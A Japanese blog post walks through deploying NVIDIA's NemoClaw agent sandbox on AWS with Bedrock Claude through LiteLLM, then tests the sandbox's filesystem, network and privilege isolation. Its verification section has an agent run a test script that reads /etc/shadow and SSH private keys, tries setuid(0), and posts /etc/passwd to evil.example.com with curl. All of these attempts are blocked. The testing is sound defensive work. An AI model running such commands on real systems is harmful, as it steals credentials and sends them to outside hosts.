---
id: "2026-03-26-nemoclawをaws上にデプロイしてbedrock-claudeで動かしてみた-01"
title: "NemoClawをAWS上にデプロイしてBedrock Claudeで動かしてみた"
url: "https://zenn.dev/exwzd/articles/20260318-nemoclaw-on-aws"
source: "zenn"
category: "claude-code"
tags: ["claude-code", "zenn"]
date_published: "2026-03-26"
date_collected: "2026-03-27"
summary_by: "auto-rss"
---

先端技術開発グループ（WAND）の加藤です。

AIエージェントが実用段階に入り、企業でも全社的に展開することで業務をより効率化したいというニーズは増えてきたはずです。

特に昨年12月のOpenClawの登場で一気にその熱は高まりを見せています。  
Claude CodeやCodexなどを普段から使うエンジニアであれば、まぁコーディングエージェントでいいんじゃない？と思う場面も多くありますが、エンジニアでない職種におけるユースケースとしてはかなり興味深いと思います。

おそらくエンタープライズの現場では、よりセキュアなAIエージェントを活用する事例がこれからどんどん増えてくるものと思います。

しかし、エンタープライズでパーソナルAIエージェントを活用しようとなると、以下のような課題が浮上します。

* **セキュリティ**: エージェントが勝手にファイルを読んだり、外部に送信したりしないか
* **ガバナンス**: 誰に何を許可するか
* **監査**: 何をしたか追跡できるか

私自身、どうやればOpenClawをセキュアに使ってもらえるかを考えて社内で実験をしていましたが、汎用的なタスクの実効性とセキュアな利用のバランスがとても難しいなと悩んでいました。

こうした課題に対して、先日NVIDIAがGTC 2026で発表したOSSスタック **NemoClaw** は非常に面白いアプローチを取っていて、とても合理的なフレームワークだなと感じました。

今回は、まずNemoClawをAWS上にデプロイし、NVIDIA APIを使わずにBedrock Claudeで動かすまでの手順について解説します。その後、実際にNemoClawを使ってOpenClawをセキュアに管理する検証についてご紹介します。

## NemoClawとは

NemoClawは、NVIDIAが開発したOSSのAIエージェント向けセキュリティスタックです。  
ベースとなるOpenClawに、**カーネルレベルのセキュリティ層**を追加したものになります。  
OpenClawのサンドボックスはLinuxコンテナ上で動作するため、ホストOSがmacOSやWindowsであってもLinuxカーネルの機能（Landlock LSMやseccomp）によるセキュリティ制約が適用されます。

ここでのポイントは、「アプリ層」と「カーネル層」の違いです。

Claude Codeなどのエージェントでは `permissions.deny` のような設定でツールの利用を制限できますが、これはあくまでアプリ層での制御です。  
エージェントが任意のコードを実行できる場合、アプリ層の制約は迂回される可能性があります。

一方、NemoClawはLinuxカーネルの **Landlock LSM** や **seccomp** を使って制約をかけるため、**エージェントがどんなコードを実行しても、カーネルの制約は迂回できません**。  
この点が、既存のエージェントセキュリティとの決定的な違いです。

## セキュリティの4層構造

NemoClawは以下の**4層**でエージェントの行動を制限します。

| 層 | 技術 | 何を防ぐか |
| --- | --- | --- |
| **ファイルシステム** | Landlock LSM | `/sandbox` 外へのアクセス |
| **ネットワーク** | egress proxy | 許可リスト外の通信（アプリ単位制御） |
| **プロセス** | seccomp + no\_new\_privs | 権限昇格・危険なsyscall |
| **推論** | Gateway | APIキー漏洩 |

この4層が重なることで、エージェントに対する**多層防御**が実現されています。

## NemoClawをAWS上で動かす

### 構成

NemoClawの推論バックエンドは **OpenAI互換APIなら何でもOK** という設計です。  
ならばOpenAIのLLMを使えばいいのでは？とも思われるかもですが、AWSに閉じた構成にするため、今回はBedrockを使いたいと思います。  
ただし、BedrockのAPIはOpenAI互換ではないものが多いため、今回は**LiteLLM**をプロキシとして挟むことで解決しました。

構成としては以下のようになります。

* **EC2** (t3.large): NemoClaw + LiteLLM を動かすホスト（NemoClawのDocker環境 + LiteLLMの常駐プロセスを考慮し、メモリ8GBのt3.largeを選択）
* **LiteLLM**: Bedrock Claude への OpenAI互換プロキシ
* **Bedrock Claude**: 推論エンジン
* 月額コスト: 約$10 + Bedrock従量課金（※2026年3月時点）

ちなみにBedrockにも[OpenAI互換API](https://docs.aws.amazon.com/ja_jp/bedrock/latest/userguide/fine-tuning-openai-apis.html)が存在しますが、Claude非対応かつus-west-2限定のため、汎用的ではありません。  
LiteLLMを使う方が色々なLLMを使えるので、柔軟性が高いです。

### 推論経路

NemoClawのサンドボックスからBedrock経由でClaudeを呼ぶまでの経路は以下の通りです。

```
OpenClaw TUI (sandbox)  ※TUI = Terminal User Interface（ターミナル上のGUI風操作画面）
  → https://inference.local/v1 (OpenShell Gateway)
    → http://172.17.0.1:4000/v1 (LiteLLM proxy on host)
      → Bedrock API (ap-northeast-1)
```

### Step 1: LiteLLMをsystemdサービスとして起動

LiteLLMを使って、BedrockのAPIを呼びます。  
以下のようなconfig.yamlを作成します。

```
# /opt/litellm/config/config.yaml
model_list:
  - model_name: "claude-sonnet"
    litellm_params:
      model: "bedrock/apac.anthropic.claude-sonnet-4-20250514-v1:0"
      aws_region_name: "ap-northeast-1"

  - model_name: "claude-haiku"
    litellm_params:
      model: "bedrock/apac.anthropic.claude-haiku-4-5-20251001-v1:0"
      aws_region_name: "ap-northeast-1"
```

### Step 2: ネットワークポリシーについて

NemoClawのサンドボックスは**ホワイトリスト方式のegress制御**です。  
サンドボックスから直接LiteLLMにアクセスする構成であれば、`nemoclaw-blueprint/policies/openclaw-sandbox.yaml` にLiteLLMのエンドポイントを追加する必要があります。

しかし今回の構成では、サンドボックス内のOpenClawは `https://inference.local/v1`（OpenShell Gateway）にリクエストを送り、**GatewayがLiteLLMに転送**します。Gatewayはサンドボックスの外（K3sクラスター内の別Pod）で動作するため、egress proxyの制御対象外です。

**そのため、LiteLLM用のネットワークポリシー追加は不要です。** 実際に今回の検証でもネットワークポリシーを追加せずに正常動作しています。

### Step 3: OpenShell Gatewayにプロバイダーを登録

```
openshell provider create \
  --name litellm \
  --type openai \
  --credential OPENAI_API_KEY=dummy \
  --config OPENAI_BASE_URL=http://172.17.0.1:4000/v1
```

ここでは何点か詰まりましたが、Claude Codeが解決策を教えてくれました。  
いつも本当にお世話になっております。

* GatewayはDockerコンテナ内で動作するため、`localhost` ではなく **Dockerブリッジのホスト側IP `172.17.0.1`** を指定する
* configキーは `endpoint` ではなく **`OPENAI_BASE_URL`**（`openshell provider get nvidia-nim` で既存設定を確認して判明しました）
* LiteLLM側の `master_key` を設定しない場合、credentialは **dummy でOK**

### Step 4: Gatewayの推論ルートを切り替え

OpenShellのGatewayにLiteLLMを設定します。

```
openshell inference set --provider litellm --model claude-sonnet --no-verify
```

確認してみましょう。

```
$ openshell inference get
Gateway inference:

  Route: inference.local
  Provider: litellm
  Model: claude-sonnet
```

### Step 5: OpenClawのモデル設定を変更

サンドボックス内のOpenClawは `nvidia/nemotron-3-super-120b-a12b` をデフォルトモデルとしてハードコードしています。  
これを `claude-sonnet` に書き換えます。

OpenClawは `openclaw.json` の `models.providers` セクションで正規にカスタムプロバイダーを定義でき、`mode: "merge"` でデフォルト設定にマージする仕組みがあります。  
`openclaw config set` コマンドで変更するのが本来の方法ですが、`/sandbox/.openclaw/` ディレクトリはLandlock LSMによって**read-only**に制限されているため、サンドボックス内からは書き込みできません。

そのため、**ホスト側から `docker exec` 経由**で `openclaw.json` を直接書き換える方法を取ります。

```
# ホスト側で実行
CONTAINER=openshell-cluster-nemoclaw

# openclaw.json のパスを特定
OCJSON=$(docker exec $CONTAINER find /run/k3s/containerd \
  -name openclaw.json -path '*/sandbox/.openclaw/*' 2>/dev/null | head -1)

# モデル設定を変更
docker exec $CONTAINER sed -i 's/nemotron-3-super-120b-a12b/claude-sonnet/g' $OCJSON
docker exec $CONTAINER sed -i 's/NVIDIA Nemotron 3 Super 120B/Claude Sonnet (Bedrock)/g' $OCJSON
docker exec $CONTAINER sed -i 's/"contextWindow": 131072/"contextWindow": 200000/g' $OCJSON
docker exec $CONTAINER sed -i 's/"maxTokens": 4096/"maxTokens": 8192/g' $OCJSON

# nvidia/ プレフィックスも除去（sedの置換で残る場合がある）
docker exec $CONTAINER sed -i 's|nvidia/claude-sonnet|claude-sonnet|g' $OCJSON

# agents 側の models.json も同様に変更
MODELS=$(docker exec $CONTAINER find /run/k3s/containerd \
  -name models.json -path '*/agents/main/agent/*' 2>/dev/null | head -1)
docker exec $CONTAINER sed -i 's/nemotron-3-super-120b-a12b/claude-sonnet/g' $MODELS
docker exec $CONTAINER sed -i 's/NVIDIA Nemotron 3 Super 120B/Claude Sonnet (Bedrock)/g' $MODELS
docker exec $CONTAINER sed -i 's|nvidia/claude-sonnet|claude-sonnet|g' $MODELS
```

### Step 6: サンドボックス内の追加設定

サンドボックスに接続して、NemoClawプラグインの設定とOpenClawのgateway起動を行います。

```
# サンドボックスに接続
openshell sandbox connect my-assistant

# NemoClawプラグイン設定（デフォルトのnemotronではなくclaude-sonnetを使うため）
mkdir -p /sandbox/.nemoclaw
echo '{"endpointType":"vllm","endpointUrl":"https://inference.local/v1","model":"claude-sonnet","credentialEnv":"OPENAI_API_KEY"}' > /sandbox/.nemoclaw/config.json

# OpenClawの初期設定
openclaw doctor  # 対話的な質問には全てYesで回答

# Gateway起動
export OPENAI_API_KEY=dummy
openclaw gateway &

# デバイスペアリング（TUI初回接続時に必要）
openclaw devices list  # ペンディングのリクエストIDを確認
openclaw devices approve <request-id>

# TUI起動
export OPENCLAW_GATEWAY_TOKEN=$(grep '"token"' /sandbox/.openclaw/openclaw.json | head -1 | sed 's/.*"token": "//;s/".*//')
openclaw tui
```

## 動作確認

ここまで設定すると、OpenClawのTUIからBedrock Claude経由で応答が返ってきます。

```
🦞 OpenClaw 2026.3.11 (29dc654)

 openclaw tui - ws://127.0.0.1:18789 - agent main - session fresh

 session agent:main:fresh

 Are you Claude, made by Anthropic?

 I am Claude, made by Anthropic, but I'm running through OpenClaw's
 infrastructure via their nvidia/claude-sonnet model endpoint.
```

LiteLLMのログでは、Gateway（172.18.0.2）からLiteLLMにリクエストが到達していることが確認できます。

```
INFO: 172.18.0.2:61144 - "POST /v1/chat/completions HTTP/1.1" 200 OK
```

LiteLLMの設定上、このリクエストはBedrock Claudeに転送されます。Bedrock側の呼び出しはCloudTrailのログでも確認可能です。

しっかりNemoClawのサンドボックスの中でClaude Sonnetが動いてます。

## 補足：NVIDIA API Keyについて

デフォルトの `nemoclaw onboard` はNVIDIA API Keyを要求します。

```
┌─────────────────────────────────────────────────────────────────┐
│  NVIDIA API Key required                                        │
│                                                                 │
│  1. Go to https://build.nvidia.com/settings/api-keys            │
│  2. Sign in with your NVIDIA account                            │
│  3. Click 'Generate API Key' button                             │
│  4. Paste the key below (starts with nvapi-)                    │
└─────────────────────────────────────────────────────────────────┘
```

企業での利用を考えると、全員がNVIDIA APIキーを取得するのは現実的ではありません。

検証の結果、`nemoclaw onboard` の対話的セットアップで **Option 3（Other OpenAI-compatible endpoint）** を選択することで、**NVIDIA API Key不要**でセットアップできることがわかりました。

```
Inference options:
  1) NVIDIA Endpoints (recommended)
  2) OpenAI
  3) Other OpenAI-compatible endpoint   ← これを選択
  ...

Choose [1]: 3
OpenAI-compatible base URL: http://172.17.0.1:4000/v1
API key: dummy
Model: claude-sonnet
```

LiteLLMがOpenAI互換APIを提供しているため、NemoClawから見ると「OpenAI互換エンドポイントに接続している」だけであり、NVIDIA固有の設定は一切不要です。

## セキュリティ検証：サンドボックスはどこまで守れるか

Bedrock Claudeが動いた状態で、NemoClawの4層セキュリティが実際に機能するか検証しました。  
エージェントに悪意のある操作を指示し、何がブロックされるかを確認します。

### 検証1: ファイルシステム隔離（Landlock LSM）

| 操作 | 結果 | 理由 |
| --- | --- | --- |
| `/tmp/test.txt` に書き込み | ✅ 成功 | `/tmp` はポリシーで **read\_write 許可** |
| `/home/test.txt` に書き込み | ❌ Permission denied | `/home` はポリシー外、**Landlock がブロック** |
| `/etc/shadow` の読み取り | ❌ Permission denied | **read-only ポリシー** + ファイルパーミッション |

![サンドボックスのポリシー画面](https://static.zenn.studio/user-upload/deployed-images/560f2c3f832a7256ac1aab06.png?sha=715b6898e0c0daf8637708890bc494be42171808)  
*↑ Filesystem Accessのポリシー。Read-onlyとRead-writeのパスが明確に分かれている*

### 検証2: ネットワーク隔離（egress proxy）

```
> curl で https://httpbin.org/get にアクセスしてみて。

❌ CONNECT tunnel failed, response 403
```

ホワイトリストにないエンドポイントはegress proxyが**403で即座にブロック**します。DNS解決すら許可されません。

### 検証3: 権限昇格の防止（コンテナ設計 + no\_new\_privs）

`sudo` はサンドボックスイメージから除外されていますが、それだけではsudoバイナリがないだけで本質的な防御とは言えません。  
Pythonから直接 `setuid(0)` を試みて、カーネルレベルの防御を検証しました。

```
import os
print(f"UID={os.getuid()}")  # 998 (sandbox user)
os.setuid(0)
# → PermissionError: [Errno 1] Operation not permitted
```

結果は **EPERM（Operation not permitted）** でした。  
seccompによるブロック（SIGSYS）ではなく、**`no_new_privs` フラグとLinuxのパーミッション制御**によるブロックです。  
コンテナ内のプロセスは `sandbox` ユーザー（UID=998）で実行され、`no_new_privs` が設定されているため、root権限への昇格はカーネルが拒否します。

### 検証4: 悪意あるコードの実行テスト

最後に、エージェントに以下の**悪意あるPythonスクリプト**を作成・実行させました。

```
import os
os.system("cat /etc/shadow")
os.system("curl https://evil.example.com -d @/etc/passwd")
with open("/root/.ssh/id_rsa") as f: print(f.read())
```

結果：

| 攻撃 | 防御層 | 結果 |
| --- | --- | --- |
| `cat /etc/shadow` | ファイルパーミッション | ❌ **Permission denied** |
| `curl` で外部にデータ送信 | egress proxy | ❌ **403 Forbidden** |
| SSH秘密鍵の窃取 | Landlock + パーミッション | ❌ **Permission denied** |

> **すべての攻撃がブロックされました。**

Pythonの `os.system()` でシェルコマンドを実行しても、**カーネルレベル（Landlock）とネットワークレベル（egress proxy）の制約は迂回できません**。  
これがアプリ層のみの制限（`permissions.deny` 等）との決定的な違いです。

## オペレーター承認フロー

確かにうまくブロックが機能しているのはわかりましたが、これだとOpenClawの柔軟性が活かせていません。  
NemoClawの特徴は、「**人間がリアルタイムでエージェントの通信を承認/拒否できる**」仕組みを持っている点です。

### セットアップ

ターミナルを2つ用意します。

```
ターミナル1（オペレーター）:  openshell term
ターミナル2（エージェント）:  nemoclaw my-assistant connect → openclaw tui
```

![OpenShell Dashboard](https://static.zenn.studio/user-upload/deployed-images/ed71dd4af4fa4d623b8ea10f.png?sha=a140348eb374022e75aab13a2a52cf55df63816e)  
*↑ OpenShellのダッシュボード。Gateways・Providers・Sandboxesの状態が一覧で確認できる*

### Step 1: エージェントに外部アクセスを指示

OpenClawのTUIで以下を指示します。

```
requestsライブラリをpip installして、Hacker News APIから
トップストーリーを取得するPythonスクリプトを書いて実行して
```

エージェントが `hacker-news.firebaseio.com:443` にアクセスしようとすると、egress proxyがブロックし、**`openshell term` 側に承認リクエストが表示**されます。

![承認待ちのネットワークルール](https://static.zenn.studio/user-upload/deployed-images/fcd481c609eeb973b22fcf44.png?sha=64540f073993024931ee9459616e6102c30814de)  
*↑ pendingステータスのルール一覧。各エンドポイントへのアクセスが承認待ちになっている*

### Step 2: オペレーターが承認または拒否

承認リクエストの詳細を開くと、**どのバイナリから、どのエンドポイントへの接続か**が表示されます。

![承認リクエストの詳細](https://static.zenn.studio/user-upload/deployed-images/212612ba11fc1aedf5d09a03.png?sha=1eecef6f0dfe5f014cbe651304a46c23d1b5d67d)  
*↑ 承認リクエストの詳細。`python3.11` から `hacker-news.firebaseio.com:443` への接続であることがわかる*

**Approve** を選択するとアクセスが許可されます。

![承認後の状態](https://static.zenn.studio/user-upload/deployed-images/16e3844f0ccda23beeee65aa.png?sha=85ea31e314832a9814258541ba89e17e991442d9)  
*↑ 承認後。ステータスが `[approved]` に変化*

**Reject** を選択した場合は、アクセスが拒否されたままになります。

![拒否後の状態](https://static.zenn.studio/user-upload/deployed-images/e3b6ed438e84f9c79feddd2d.png?sha=06ad5a8d96878bf1925af44d60b60472ad1ad975)  
*↑ 拒否後。ステータスが `[rejected]` に変化*

### Step 3: 承認後、エージェントが再実行

最初のテストでは、「requestsライブラリをpip install」と指示していたのですが、`pip install`にも別途承認が必要でした。  
標準ライブラリ（`urllib`）なら追加インストール不要で、承認済みエンドポイントに即アクセス可能なので、一旦これで試してみます。

```
> urllibを使って
> https://hacker-news.firebaseio.com/v0/topstories.json
> にアクセスして上位5件のIDを表示して

✅ 成功！

結果：
1. Story ID: 47372367
2. Story ID: 47389696
3. Story ID: 47418295
4. Story ID: 47416736
5. Story ID: 47413876
```

ちなみに、承認はセッション限定で、永続化するにはポリシーファイルを編集して `openshell policy set` で適用可能です。

### 企業での活用イメージ

企業内でパーソナルAIエージェントを活用する際には以下のような流れになるのかなと思います。

1. 従業員がエージェントを使って作業中、**未知のAPIにアクセスが必要**になる
2. セキュリティチームのオペレーターが `openshell term` で**リアルタイム監視**
3. 承認/拒否を判断 → **承認ログが監査証跡**になる
4. 頻繁に使うエンドポイントは**ポリシーに昇格**させて恒久許可

この仕組みは、企業でAIエージェントを安全に運用するための重要なピースになりそうだと思います。  
一方で、リアルタイムで承認/拒否の判断をすることになるため、人間による監視負荷も高くなります。この辺りはこれから運用の改善を考える必要があるのかなと思います。

## 比較：素のOpenClawとNemoClawの違い

OpenClawとNemoClawの違いをまとめておきます。

| 観点 | 素のOpenClaw | + NemoClaw |
| --- | --- | --- |
| **FS隔離** | permissions.deny（迂回可能） | **Landlock LSM（迂回不可）** |
| **ネットワーク** | 制限なし | **アプリ単位のegress制御** |
| **APIキー** | エージェント内に平文 | **Gateway経由（不要）** |
| **権限管理** | なし | **YAMLポリシー** |
| **監査** | なし | **サンドボックスログ** |

こうやってみると、「素のOpenClaw怖すぎる」となりますね。。。

## まとめ

NemoClawは、AIエージェントの企業導入における「セキュリティをどう担保するか」という課題に対して、カーネルレベルの制約という強力なアプローチで応えています。

まだAlpha段階ではありますが、ガバナンスのあり方としては非常に良い方向性と感じました。  
特に、**オペレーター承認フロー**は企業でのAIエージェント運用を考えると、まさに欲しかった機能です。

一方で、企業導入にはNemoClaw単体では足りない部分もあります。  
例えば、Cedarポリシーによる論理的な権限判定や、AI同士の連携を統制・記録する仕組みなど、ガバナンス層の追加が必要になると思います。

今後もNemoClawの動向を注視しつつ、エージェントセキュリティの実践的な知見を蓄積していきたいと思います！

※記載されている会社名、製品名は各社の商標または登録商標です
